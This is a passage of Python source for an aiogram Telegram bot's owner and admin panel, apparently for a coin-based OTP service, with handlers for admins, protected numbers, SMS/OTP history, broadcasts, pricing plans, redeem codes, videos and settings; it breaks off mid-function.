async def admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\n"
        f"Total: <b>{len(d.get('admins', []))}</b>",
        admins_menu_kb(d),
    )

@R.callback_query(F.data == "owner:admins:add")
async def admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_admin)
    await safe_edit(
        cq,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nSend user ID:",
        kb([(sc("cancel"), "owner:admins:menu")]),
    )

@R.message(S.add_admin)
async def admins_add_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        nid = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Valid ID.", parse_mode="HTML")
        return
    if nid in d.get("admins", []) or is_owner(nid, d):
        await state.clear()
        await m.answer(f"⚠️ Already!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(nid)
    log_audit(d, "add_admin", m.from_user.id, nid)
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{nid}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML",
    )
    try:
        await m.bot.send_message(nid, f"🛡 <b>You're now an Admin!</b>", parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        did = int(cq.data.split("owner:admins:del:", 1)[1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    if did in d.get("admins", []):
        d["admins"].remove(did)
        log_audit(d, "del_admin", cq.from_user.id, did)
        save()
        try:
            await cq.answer("🗑 Removed!")
        except Exception:
            pass
    await admins_menu(cq, state)

# ============================================================
#  PROTECTED NUMBERS
# ============================================================
@R.callback_query(F.data == "owner:protect")
async def protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.protect_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Send number to protect:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.protect_number)
async def protect_done(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    num = (m.text or "").strip()
    cl = num.replace("+", "").replace(" ", "").replace("-", "")
    if not cl.isdigit() or len(cl) < 7:
        await m.answer(f"❌ Invalid number.", parse_mode="HTML")
        return
    PROTECTED_NUMBERS[num] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save()
    await state.clear()
    await m.answer(
        f"{em(EMOJI_LOCK, '🔒')} Protected: <code>{esc(num)}</code>",
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:protected_list")
async def protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    pr = d.get("protected_numbers", {})
    if not pr:
        await safe_edit(
            cq,
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected</b>\n\n❌ None.",
            kb([(sc("back"), "owner:home")]),
        )
        return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers</b>\n"]
    for num, pu in pr.items():
        lines.append(f"📞 <code>{esc(num)}</code> — <code>{pu}</code>")
    await safe_edit(cq, "\n".join(lines), kb([(sc("back"), "owner:home")]))

# ============================================================
#  TRACK NUMBER
# ============================================================
@R.callback_query(F.data == "owner:track")
async def track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.track_number)
    await safe_edit(
        cq,
        f"{em(EMOJI_STAR, '📊')} <b>Track Number</b>\n\nSend number:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.track_number)
async def track_done(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    num = (m.text or "").strip()
    await state.clear()
    hist = d.get("sms_history", {})
    who = []
    for us, hl in hist.items():
        for e in hl:
            if e.get("number") == num:
                ud = d.get("users", {}).get(us, {})
                who.append({
                    "uid": int(us),
                    "name": ud.get("name", "?"),
                    "ts": e.get("timestamp", 0),
                })
                break
    if not who:
        await m.answer(
            f"{em(EMOJI_STAR, '📊')} Track\n\n<code>{esc(num)}</code>\n\n❌ No records.",
            reply_markup=kb([(sc("back"), "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>{esc(num)}</b>\n"]
    for e in who[:50]:
        lines.append(f"• <code>{e['uid']}</code> — {esc(str(e['name'])[:20])} — {fmt_time(e['ts'])}")
    if len(who) > 50:
        lines.append(f"<i>+{len(who) - 50} more</i>")
    await m.answer(
        "\n".join(lines),
        reply_markup=kb([(sc("back"), "owner:home")]),
        parse_mode="HTML",
    )

# ============================================================
#  SMS / OTP GLOBAL HISTORY (owner)
# ============================================================
@R.callback_query(F.data == "owner:sms_history")
async def sms_hist(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    allh = d.get("sms_history", {})
    tot = sum(len(v) for v in allh.values())
    await safe_edit(
        cq,
        f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\n"
        f"Total: <b>{tot}</b>\n"
        f"Users with history: <b>{len(allh)}</b>",
        kb([(sc("back"), "owner:home")]),
    )

@R.callback_query(F.data == "owner:otp_history")
async def otp_hist_owner(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    allh = d.get("otp_history", {})
    tot = sum(len(v) for v in allh.values())
    stats = d.get("stats", {})
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>Global OTP History</b>\n\n"
        f"Total: <b>{tot}</b>\n"
        f"Users with history: <b>{len(allh)}</b>\n"
        f"Fetches: <b>{stats.get('otp_fetches', 0)}</b>\n"
        f"Refunds: <b>{stats.get('otp_refunds', 0)}</b>",
        kb([(sc("back"), "owner:home")]),
    )

# ============================================================
#  COIN LEDGER (owner)
# ============================================================
@R.callback_query(F.data == "owner:coin_ledger")
async def owner_coin_ledger(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    users = d.get("users", {})
    total_coins = sum(int(u.get("coins", 0)) for u in users.values())
    total_credits = sum(int(u.get("credits", 0)) for u in users.values())
    otp_total = sum(len(v) for v in d.get("otp_history", {}).values())
    stats = d.get("stats", {})
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Coin Ledger</b>\n\n"
        f"💰 Total Credits: <b>{total_credits}</b>\n"
        f"🪙 Total Coins: <b>{total_coins}</b>\n"
        f"🔐 OTP Fetches: <b>{stats.get('otp_fetches', 0)}</b>\n"
        f"♻️ OTP Refunds: <b>{stats.get('otp_refunds', 0)}</b>\n"
        f"🔐 Cost: <b>{get_otp_cost(d)}</b> coins/use",
        kb([(sc("back"), "owner:home")]),
    )

# ============================================================
#  ACTIVITY / AUDIT LOGS
# ============================================================
@R.callback_query(F.data == "owner:activity")
async def activity(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    ent = d.get("activity_log", [])[-25:]
    if not ent:
        txt = f"{em(EMOJI_GEAR, '📜')} <b>Activity</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity</b>\n"]
        for e in reversed(ent):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(
                f"[{ts}] <code>{e.get('uid', 0)}</code> "
                f"{e.get('action', '?')} — {esc(str(e.get('details', ''))[:60])}"
            )
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([
        (sc("refresh"), "owner:activity"),
        (sc("back"), "owner:home"),
    ]))

@R.callback_query(F.data == "owner:audit")
async def audit(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    ent = d.get("audit_log", [])[-30:]
    if not ent:
        txt = f"{em(EMOJI_LOCK, '🔐')} <b>Audit Log</b>\n\nEmpty."
    else:
        lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Audit Log</b>\n"]
        for e in reversed(ent):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(
                f"[{ts}] <code>{e.get('uid', 0)}</code> "
                f"{e.get('action', '?')} — {esc(str(e.get('details', ''))[:60])}"
            )
        txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([
        (sc("refresh"), "owner:audit"),
        (sc("back"), "owner:home"),
    ]))

# ═══════════════════════════════════════════════════════════
#  END OF PART 7 — paste PART 8 after this line
# ═══════════════════════════════════════════════════════════
# ============================================================
#  PART 8 — OWNER FLOWS PART 2
#  pricing • redeem codes • videos • settings • github
#  templates • scheduled • tickets owner • leaderboard view
#  upcoming updates • appeals • announcements • broadcast
#  export script
# ============================================================

# ============================================================
#  BROADCAST (single handler — bug fix)
# ============================================================
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def bc_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.broadcast)
    await state.update_data(broadcast_mode="normal")
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n"
        f"Send the message to broadcast to all users:",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.broadcast)
async def bc_do(m: Message, state: FSMContext):
    """Single broadcast handler — handles both normal broadcast and announcement."""
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    mode = fsmd.get("broadcast_mode", "normal")
    await state.clear()

    txt = (m.text or "").strip()
    if not txt:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return

    if mode == "announcement":
        # save to announcements
        d.setdefault("announcements", []).append({
            "uid": uid,
            "text": txt[:1000],
            "ts": now_ts(),
        })
        save()
        header = "📣 <b>Announcement</b>"
    else:
        header = "📢 <b>Broadcast</b>"

    users = d.get("users", {})
    if not users:
        await m.answer(f"❌ No users to broadcast.", parse_mode="HTML")
        return

    wait = None
    try:
        wait = await m.answer(f"📤 Sending to <b>{len(users)}</b>…", parse_mode="HTML")
    except Exception:
        pass

    ok = 0
    fail = 0
    for us in list(users.keys()):
        try:
            await m.bot.send_message(
                int(us),
                f"{header}\n\n{esc(txt)}",
                parse_mode="HTML",
            )
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)

    if wait:
        try:
            await wait.delete()
        except Exception:
            pass

    log_audit(d, "broadcast" if mode == "normal" else "announcement", uid,
              f"ok={ok} fail={fail} mode={mode}")
    save()

    bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} {mode.title()} done!\n"
        f"✅ {ok} | ❌ {fail}",
        reply_markup=bk,
        parse_mode="HTML",
    )

# ============================================================
#  PRICING PLANS
# ============================================================
@R.callback_query(F.data == "owner:pricing:menu")
async def pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    plans = d.get("pricing", {}).get("plans", [])
    txt = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, p in enumerate(plans, 1):
        cur = p.get("currency", "credits")
        amt = p.get("credits", 0) if cur == "credits" else p.get("coins", 0)
        icon = "💰" if cur == "credits" else "🪙"
        txt += (
            f"{i}. <b>{esc(p['name'])}</b>\n"
            f"   {p['price']} INR = {amt} {icon}\n"
            f"   {esc(p['payment_link'])}\n\n"
        )
    rows = [
        [btn("add plan", "owner:pricing:add", EMOJI_PLUS, "➕")],
        [btn("remove plan", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:pricing:add")
async def pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_plan_name)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💳')} <b>Add Plan</b>\n\nStep 1/5: Name:",
        kb([(sc("cancel"), "owner:pricing:menu")]),
    )

@R.message(S.add_plan_name)
async def pricing_name(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    nm = (m.text or "").strip()[:64]
    if not nm:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    await state.update_data(plan_name=nm)
    await state.set_state(S.add_plan_price)
    await m.answer("Step 2/5: Price (INR):", parse_mode="HTML")

@R.message(S.add_plan_price)
async def pricing_price(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        p = float((m.text or "").strip())
        if p < 0:
            raise ValueError
        await state.update_data(plan_price=p)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_currency)
    await m.answer("Step 3/5: Type <code>credits</code> or <code>coins</code>:", parse_mode="HTML")

@R.message(S.add_plan_currency)
async def pricing_currency(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    c = (m.text or "").strip().lower()
    if c not in ("credits", "coins"):
        await m.answer(f"❌ Type credits or coins.", parse_mode="HTML")
        return
    await state.update_data(plan_currency=c)
    if c == "credits":
        await state.set_state(S.add_plan_credits)
        await m.answer("Step 4/5: Credits amount:")
    else:
        await state.set_state(S.add_plan_coins)
        await m.answer("Step 4/5: Coins amount:")

@R.message(S.add_plan_credits)
async def pricing_credits(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c <= 0:
            raise ValueError
        await state.update_data(plan_credits=c)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await m.answer("Step 5/5: Payment link:")

@R.message(S.add_plan_coins)
async def pricing_coins(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c <= 0:
            raise ValueError
        await state.update_data(plan_coins=c)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await m.answer("Step 5/5: Payment link:")

@R.message(S.add_plan_link)
async def pricing_link(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    link = (m.text or "").strip()
    if not link.startswith("http"):
        await m.answer(f"❌ URL must start with http.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time() * 1000)),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "currency": fsmd.get("plan_currency", "credits"),
        "credits": fsmd.get("plan_credits", 0),
        "coins": fsmd.get("plan_coins", 0),
        "payment_link": link,
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    log_audit(d, "add_plan", m.from_user.id, plan["name"])
    save()
    await state.clear()
    await m.answer(
        f"✅ Added!",
        reply_markup=kb([(sc("back"), "owner:pricing:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        try:
            await cq.answer("❌ No plans")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    rows = []
    for p in plans:
        rows.append([btn(p['name'][:25], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("back", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    pid = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != pid]
    save()
    try:
        await cq.answer("🗑 Removed!")
    except Exception:
        pass
    await pricing_menu(cq, state)

# ============================================================
#  REDEEM CODES
# ============================================================
@R.callback_query(F.data == "owner:redeem:menu")
async def redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    codes = d.get("redeem_codes", {})
    txt = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, cd in list(codes.items())[:10]:
        st = "✅" if cd.get("uses_left", 0) > 0 else "❌"
        cur = cd.get("currency", "credits")
        ic = "💰" if cur == "credits" else "🪙"
        txt += f"<code>{esc(code)}</code> — {cd['credits']}{ic} — {st} ({cd.get('uses_left', 0)})\n"
    if len(codes) > 10:
        txt += f"\n<i>+{len(codes) - 10} more</i>"
    rows = [
        [btn("generate", "owner:redeem:gen", EMOJI_PLUS, "➕")],
        [btn("delete", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:redeem:gen")
async def redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.gen_redeem_currency)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n"
        f"Step 1/3: Type <code>credits</code> or <code>coins</code>:",
        kb([(sc("cancel"), "owner:redeem:menu")]),
    )

@R.message(S.gen_redeem_currency)
async def redeem_currency(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    c = (m.text or "").strip().lower()
    if c not in ("credits", "coins"):
        await m.answer(f"❌ credits / coins.", parse_mode="HTML")
        return
    await state.update_data(gen_currency=c)
    await state.set_state(S.gen_redeem_credits)
    await m.answer(f"Step 2/3: Amount ({c}):")

@R.message(S.gen_redeem_credits)
async def redeem_credits(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c <= 0:
            raise ValueError
        await state.update_data(gen_credits=c)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await m.answer("Step 3/3: Uses:")

@R.message(S.gen_redeem_uses)
async def redeem_uses(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        u = int((m.text or "").strip())
        if u < 1:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    currency = fsmd.get("gen_currency", "credits")
    for _ in range(20):
        code = "SJ" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
        if code not in d.get("redeem_codes", {}):
            break
    else:
        code = "SJ" + str(now_ts())[-10:]
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "currency": currency,
        "uses_left": u,
        "created_by": m.from_user.id,
        "created_at": now_ts(),
        "used_by": [],
    }
    log_audit(d, "gen_redeem", m.from_user.id, f"{code} {credits} {currency} x{u}")
    save()
    await state.clear()
    await m.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Code!</b>\n\n"
        f"<code>{esc(code)}</code>\n"
        f"{credits} {currency}\n"
        f"🔢 {u}",
        reply_markup=kb([(sc("back"), "owner:redeem:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:redeem:del")
async def redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        try:
            await cq.answer("❌ None")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("back", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Code</b>",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save()
    try:
        await cq.answer("🗑")
    except Exception:
        pass
    await redeem_menu(cq, state)

# ============================================================
#  VIDEOS
# ============================================================
@R.callback_query(F.data == "owner:videos:menu")
async def vids_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_VIDEO, '📹')} <b>Videos</b>\n\n"
        f"Total: <b>{len(d.get('videos', []))}</b>",
        videos_menu_kb(d),
    )

@R.callback_query(F.data == "owner:videos:add")
async def vids_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_video)
    await safe_edit(
        cq,
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\n"
        f"Send video, video file, or URL:",
        kb([(sc("cancel"), "owner:videos:menu")]),
    )

@R.message(S.add_video)
async def vids_add_done(m: Message, state: FSMContext):
    d = load()
    if not is_admin(m.from_user.id, d):
        await state.clear()
        return
    vid = None
    if m.video:
        vid = m.video.file_id
    elif m.document and m.document.mime_type and m.document.mime_type.startswith("video"):
        vid = m.document.file_id
    elif m.text:
        vid = m.text.strip()
    if not vid:
        await m.answer(f"❌ Valid video or URL required.", parse_mode="HTML")
        return
    d.setdefault("videos", []).append(vid)
    save()
    await state.clear()
    await m.answer(
        f"✅ Saved!",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def vids_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        idx = int(cq.data.split("owner:videos:del:", 1)[1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx)
        d["videos"] = vids
        save()
        try:
            await cq.answer("🗑 Removed!")
        except Exception:
            pass
    await vids_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def vids_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    d["videos"] = []
    save()
    try:
        await cq.answer("🗑 All deleted!", show_alert=True)
    except Exception:
        pass
    await vids_menu(cq, state)

# ============================================================
#  SETTINGS
# ============================================================
@R.callback_query(F.data == "owner:settings")
async def settings_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    s = d.get("settings", {})
    od = get_owner_display(d) or "<i>(hidden)</i>"
    terms_req = "🟢 ON" if s.get("terms_required", True) else "🔴 OFF"
    txt = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Settings</b>\n\n"
        f"👤 Owner: <b>{od}</b>\n"
        f"🎁 Ref Credits: <b>{s.get('ref_credits', 3)}</b>\n"
        f"🪙 Ref Coins: <b>{s.get('ref_coins', 1)}</b>\n"
        f"🔐 OTP Cost: <b>{s.get('otp_cost', 1)}</b> coins\n"
        f"⏱ OTP Fresh: <b>{s.get('otp_fresh_window', 900) // 60} min</b>\n"
        f"🎁 Daily Bonus: <b>{s.get('daily_bonus_credits', 2)} credits</b>\n"
        f"📜 Terms required: <b>{terms_req}</b>"
    )
    rows = [
        [btn("edit owner name", "owner:edit_name", EMOJI_CROWN, "✏️", style="primary")],
        [btn("referral credits", "owner:settings:ref", EMOJI_GIFT, "🎁"),
         btn("referral coins", "owner:settings:refcoin", EMOJI_COIN, "🪙")],
        [btn("otp cost", "owner:settings:otpcost", EMOJI_OTP, "🔐"),
         btn("otp fresh window", "owner:settings:otpfresh", EMOJI_CLOCK, "⏱")],
        [btn("daily bonus", "owner:settings:bonus", EMOJI_GIFT, "🎁")],
        [btn("maintenance msg", "owner:settings:maintmsg", EMOJI_BELL, "📢")],
        [btn("toggle terms gate", "owner:settings:termstoggle", EMOJI_LOCK, "🔐")],
        [btn("edit terms text", "owner:settings:termstext", EMOJI_FILE, "📝")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:settings:termstoggle")
async def settings_terms_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    cur = d.setdefault("settings", {}).get("terms_required", True)
    d["settings"]["terms_required"] = not cur
    save()
    try:
        await cq.answer(f"Terms gate: {'ON' if d['settings']['terms_required'] else 'OFF'}", show_alert=True)
    except Exception:
        pass
    await settings_menu(cq, state)

@R.callback_query(F.data == "owner:settings:termstext")
async def settings_terms_text(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("Terms text edit is a sensitive feature.", show_alert=True)
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>Terms text</b>\n\n"
        f"Current terms text is set in code (v{d.get('terms', {}).get('version', 1)}).\n\n"
        f"To customise, edit the <code>terms.text</code> field in "
        f"<code>{esc(_DATA_FILE)}</code> and restart the bot.\n"
        f"Or bump <code>terms.version</code> to force all users to re-accept.",
        kb([(sc("back"), "owner:settings")]),
    )

@R.callback_query(F.data == "owner:settings:ref")
async def settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_ref_credits)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Referral Credits</b>\n\nAmount:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_ref_credits)
async def settings_ref_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
